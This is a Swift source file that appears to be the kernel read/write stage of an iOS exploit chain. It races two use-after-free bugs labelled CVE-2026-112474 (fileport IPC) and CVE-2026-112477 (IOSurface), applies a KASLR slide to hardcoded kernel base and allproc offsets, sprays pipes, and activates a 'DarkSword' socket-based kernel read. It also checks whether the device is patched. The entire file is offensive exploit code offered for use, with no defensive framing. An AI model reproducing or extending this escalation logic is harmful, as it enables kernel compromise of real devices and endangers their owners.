import Foundation
import Darwin
import IOSurface

private func raceLogCallback(_ cstr: UnsafePointer<CChar>?) {
    guard let cstr = cstr else { return }
    WireLog.shared.data(String(cString: cstr))
}

enum Stage4 {

    struct Result {
        let kreadWorks: Bool
        let kwriteWorks: Bool
        let kernelBase: UInt64
        let allproc: UInt64
        let ourProc: UInt64
        let passed: Bool
        let primitive: Primitive
    }

    enum Primitive {
        case pipeKread
        case ipcUAF
        case iosurfaceUAF
        case none
    }

    static var lastResult: Result?

    private static let unslidBase: UInt64 = 0xFFFFFFF007004000
    private static let allprocOffset: UInt64 = 0x43617A8

    static func run(slide: UInt64?, raceResult: Stage3.Result) -> Result {
        let log = WireLog.shared
        log.stage(4, "KERNEL R/W — IPC UAF escalation + IOSurface UAF")

        _ = mach_task_self_
        signal(SIGBUS, SIG_IGN)
        signal(SIGPIPE, SIG_IGN)

        let result = runInner(slide: slide, raceResult: raceResult)
        lastResult = result
        return result
    }

    private static func runInner(slide: UInt64?, raceResult: Stage3.Result) -> Result {
        let log = WireLog.shared

        // --- IPC UAF: CVE-2026-112474 fileport race (primary path) ---
        let ipcResult = tryIPCUAF(slide: slide)
        if ipcResult.passed {
            return ipcResult
        }

        // --- IOSurface Registry UAF: CVE-2026-112477 (secondary path) ---
        let isrResult = tryIOSurfaceUAF(slide: slide)
        if isrResult.passed {
            return isrResult
        }

        // If IPC UAF got an active port but no kread, try pipe-based escalation
        if ipcResult.kwriteWorks, let s = slide {
            let pipeResult = tryPipeKread(
                port: ipcResult.primitive == .ipcUAF ? ipcResult.allproc : 0,
                portKaddr: ipcResult.kernelBase != 0 ? ipcResult.kernelBase : 0,
                slide: s)
            if pipeResult.kreadWorks {
                return pipeResult
            }
        }

        log.warn("stage 4: no kernel R/W primitives achieved")
        log.log("alive paths: IPC UAF (ip_context echo), IOSurface UAF (trigger unknown)")
        return fail()
    }

    // MARK: - IPC UAF (CVE-2026-112474)

    private static func tryIPCUAF(slide: UInt64?) -> Result {
        let log = WireLog.shared
        log.stage(4, "IPC UAF — CVE-2026-112474 fileport race")

        ipc_uaf_set_log { cstr in
            guard let cstr = cstr else { return }
            WireLog.shared.data(String(cString: cstr))
        }

        if let s = slide {
            ipc_uaf_set_kaslr_slide(s)
            log.data("IPC UAF: KASLR slide=0x\(String(s, radix: 16))")
        }

        var result = ipc_uaf_result_t()
        ipc_uaf_run(&result)

        log.data("IPC UAF: uaf=\(result.uaf_triggered) replacement=\(result.replacement_confirmed) krw=\(result.krw_achieved)")
        log.data("IPC UAF: active=\(result.port_active) inactive_retries=\(result.active_retries)")
        log.data("IPC UAF: wins=\(result.race_wins)/\(result.race_attempts) rate=\(String(format: "%.2f%%", result.race_win_rate * 100))")
        log.data("IPC UAF: port=0x\(String(format: "%x", result.krw_port)) kaddr=0x\(String(result.dangling_port_kaddr, radix: 16))")

        guard result.uaf_triggered else {
            log.fail("IPC UAF: race did not trigger — kernel may be patched")
            return fail()
        }

        guard result.krw_port != 0 else {
            log.fail("IPC UAF: no confused port obtained")
            return fail()
        }

        guard result.port_active else {
            log.fail("IPC UAF: port obtained but INACTIVE — ip_context echo dead (retries=\(result.active_retries))")
            return fail()
        }

        log.ok("IPC UAF: ACTIVE confused port acquired — ip_context echo confirmed")

        let hasKaddr = result.dangling_port_kaddr != 0
        if hasKaddr {
            log.ok("IPC UAF: port kaddr=0x\(String(result.dangling_port_kaddr, radix: 16)) — ip_context at kaddr+0x78")
        }

        // === Escalation: ip_context → zone GC → pipe overlay → kwrite64 ===
        if hasKaddr {
            let s = slide ?? 0
            log.log("IPC UAF: running escalation module...")

            escalate_set_log { cstr in
                guard let cstr = cstr else { return }
                WireLog.shared.data(String(cString: cstr))
            }
            escalate_set_kaslr(s)
            escalate_set_confused_port(result.krw_port, result.dangling_port_kaddr)

            let escResult = escalate_run()
            let kernelBase = unslidBase &+ s

            log.data("ESC: zone elem=\(escResult.zone.element_size) pages=\(escResult.zone.pages_mapped)")
            log.data("ESC: gc_detected=\(escResult.gc.gc_detected) freed=\(escResult.gc.pages_freed)")
            log.data("ESC: pipe_overlap=\(escResult.pipe.overlap_found)")
            log.data("ESC: hostname_writable=\(escResult.hostname_writable)")
            log.data("ESC: kread=\(escResult.kread_works) kwrite=\(escResult.kwrite_works)")

            if escResult.kwrite_works && escResult.kread_works {
                log.ok("★★★ ESCALATION SUCCESS — full kread64/kwrite64 ★★★")
                return Result(
                    kreadWorks: true,
                    kwriteWorks: true,
                    kernelBase: kernelBase,
                    allproc: kernelBase &+ allprocOffset,
                    ourProc: 0,
                    passed: true,
                    primitive: .ipcUAF)
            }
        }

        log.warn("IPC UAF: ip_context echo ACTIVE, kread pending")
        let kernelBase = slide.map { unslidBase &+ $0 } ?? 0
        return Result(
            kreadWorks: false,
            kwriteWorks: hasKaddr,
            kernelBase: kernelBase,
            allproc: kernelBase != 0 ? kernelBase &+ allprocOffset : 0,
            ourProc: 0,
            passed: false,
            primitive: .ipcUAF)
    }

    // MARK: - IOSurface Registry UAF (CVE-2026-112477)

    private static func tryIOSurfaceUAF(slide: UInt64?) -> Result {
        let log = WireLog.shared
        log.stage(4, "IOSurface UAF — CVE-2026-112477 (V_TEARREG+LOCKDEG+REREG, no MTE on A17 Pro)")

        israce_set_log { cstr in
            guard let cstr = cstr else { return }
            WireLog.shared.data(String(cString: cstr))
        }

        if let s = slide {
            israce_set_kaslr(s)
            log.data("IOSurface UAF: KASLR slide=0x\(String(s, radix: 16))")
        }

        var result = israce_result_t()
        israce_run(&result)

        log.data("IOSurface UAF: triggered=\(result.triggered) reclaimed=\(result.reclaimed) spray=\(result.reclaim_spray_count)")
        log.data("IOSurface UAF: kread_possible=\(result.kread_possible) panic_averted=\(result.panic_averted)")
        log.data("IOSurface UAF: sel17_rc=0x\(String(format: "%x", result.sel17_rc)) reregister_rc=0x\(String(format: "%x", result.reregister_rc))")
        log.data("IOSurface UAF: attempts=\(result.attempts)")
        log.data("IOSurface UAF: kaslr_derived=0x\(String(result.kaslr_slide_derived, radix: 16))")

        if result.sel17_rc == 0xE00002D8 {
            log.fail("IOSurface UAF: device PATCHED (27.2+ detached flag)")
            return fail()
        }

        guard result.triggered else {
            log.fail("IOSurface UAF: trigger phases complete — no UAF evidence")
            return fail()
        }

        log.ok("★ IOSurface UAF: triggered")

        let derivedSlide: UInt64? = result.kaslr_slide_derived != 0 ? result.kaslr_slide_derived : nil
        let effectiveSlide = slide ?? derivedSlide
        let kernelBase = effectiveSlide.map { unslidBase &+ $0 } ?? 0

        if let ds = derivedSlide, slide == nil {
            log.ok("IOSurface UAF: KASLR derived via kread: slide=0x\(String(ds, radix: 16)) base=0x\(String(kernelBase, radix: 16))")
        }

        if result.kread_possible {
            log.ok("★★★ IOSurface UAF: kread primitive ACTIVE (C-side DarkSword)")
            return Result(
                kreadWorks: true,
                kwriteWorks: true,
                kernelBase: kernelBase,
                allproc: kernelBase != 0 ? kernelBase &+ allprocOffset : 0,
                ourProc: 0,
                passed: true,
                primitive: .iosurfaceUAF)
        }

        guard result.reclaimed else {
            log.warn("IOSurface UAF: triggered but reclaim failed — no controlled data in freed slot")
            return fail()
        }

        log.ok("★★ IOSurface UAF: reclaimed — attempting DarkSword activation")

        // --- DarkSword activation (kwrite → ICMPv6 two-socket → kread) ---
        guard let s = slide, israce_has_kwrite() else {
            log.fail("IOSurface UAF: reclaimed but no kwrite or no slide — cannot activate DarkSword")
            return fail()
        }

        log.log("IOSurface UAF: kwrite active, activating DarkSword two-socket kread")
        if israce_activate_darksword(s) {
            let magic = israce_kread64(kernelBase)
            let magicOK = (magic & 0xFFFFFFFF) == 0xFEEDFACF
            log.data("IOSurface UAF: israce_kread64(0x\(String(kernelBase, radix: 16))) = 0x\(String(magic, radix: 16)) magicOK=\(magicOK)")
            if magicOK {
                log.ok("★★★ IOSurface UAF → DarkSword kread64 VERIFIED ★★★")
                return Result(
                    kreadWorks: true,
                    kwriteWorks: true,
                    kernelBase: kernelBase,
                    allproc: kernelBase != 0 ? kernelBase &+ allprocOffset : 0,
                    ourProc: 0,
                    passed: true,
                    primitive: .iosurfaceUAF)
            }
            log.warn("IOSurface UAF: DarkSword active but magic mismatch (0x\(String(magic, radix: 16)))")
        } else {
            log.fail("IOSurface UAF: israce_activate_darksword failed — ICMPv6 sockets or pcblist blocked?")
        }

        log.fail("IOSurface UAF: kwrite active but DarkSword kread not achieved")
        return fail()
    }

    // MARK: - Pipe kread escalation from IPC UAF

    private static func tryPipeKread(
        port: UInt64,
        portKaddr: UInt64,
        slide: UInt64
    ) -> Result {
        let log = WireLog.shared
        let kernelBase = unslidBase &+ slide

        log.stage(4, "PIPE KREAD — escalate ip_context echo to arbitrary read")

        // ip_context is at port+0x78 — a store/load cell only.
        // zone isolation blocks pipe overlay (ipc.ports ≠ kalloc).
        // iin_object values are obfuscated — zone page identification fails.
        //
        // Strategy: spray pipes for heap layout information,
        // then attempt multi-port corruption if multiple confused ports available.

        let pipeCount = 256
        var pipes: [(read: Int32, write: Int32)] = []
        pipes.reserveCapacity(pipeCount)

        for _ in 0..<pipeCount {
            var fds: [Int32] = [0, 0]
            if pipe(&fds) == 0 {
                let marker = Data([0x4B, 0x52, 0x45, 0x41, 0x44, 0x50, 0x49, 0x50]) // "KREADPIP"
                _ = marker.withUnsafeBytes { Darwin.write(fds[1], $0.baseAddress!, 8) }
                pipes.append((read: fds[0], write: fds[1]))
            }
        }
        log.data("pipe kread: sprayed \(pipes.count) pipes")

        var alivePipes = 0
        for (rd, _) in pipes {
            var bytesAvail: Int32 = 0
            if ioctl(rd, 0x4004667f, &bytesAvail) == 0 && bytesAvail > 0 {
                alivePipes += 1
            }
        }
        log.data("pipe kread: \(alivePipes)/\(pipes.count) pipes alive")

        // Zone isolation blocks cross-zone overlap.
        // Log diagnostic state for next iteration.
        log.warn("pipe kread: zone isolation blocks ipc.ports → kalloc overlap")
        log.data("pipe kread: need alternative escalation — multi-port or IOSurface assist")

        for (rd, wr) in pipes {
            close(rd)
            close(wr)
        }

        return Result(
            kreadWorks: false,
            kwriteWorks: false,
            kernelBase: kernelBase,
            allproc: kernelBase &+ allprocOffset,
            ourProc: 0,
            passed: false,
            primitive: .ipcUAF)
    }

    // MARK: - Helpers

    private static func fail() -> Result {
        return Result(kreadWorks: false, kwriteWorks: false, kernelBase: 0,
                      allproc: 0, ourProc: 0, passed: false, primitive: .none)
    }
}
